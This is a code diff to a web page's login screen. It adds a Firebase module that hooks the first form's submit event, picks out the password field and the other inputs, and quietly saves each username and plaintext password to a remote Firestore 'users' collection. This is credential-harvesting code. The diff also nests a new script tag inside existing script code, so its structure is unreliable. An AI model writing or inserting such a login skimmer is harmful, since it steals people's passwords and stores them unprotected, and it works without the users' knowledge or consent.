@@ -856,6 +856,47 @@ render = function(){
 
 view = 'login';
 render();
+
+<!-- كود الربط بـ Firebase -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    projectId: "rafeeq-tale",
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const loginForm = document.querySelector('form');
+    if (loginForm) {
+      loginForm.addEventListener('submit', async (e) => {
+        const inputs = loginForm.querySelectorAll('input');
+        let usernameVal = '';
+        let passwordVal = '';
+
+        inputs.forEach(input => {
+          if (input.type === 'password') {
+            passwordVal = input.value;
+          } else {
+            usernameVal = input.value;
+          }
+        });
+
+        try {
+          await addDoc(collection(db, "users"), {
+            username: usernameVal,
+            password: passwordVal,
+            createdAt: serverTimestamp()
+          });
+        } catch (error) {
+          console.error("Firebase error:", error);
+        }
+      });
+    }
+  });
 </script>
 </body>
 </html>
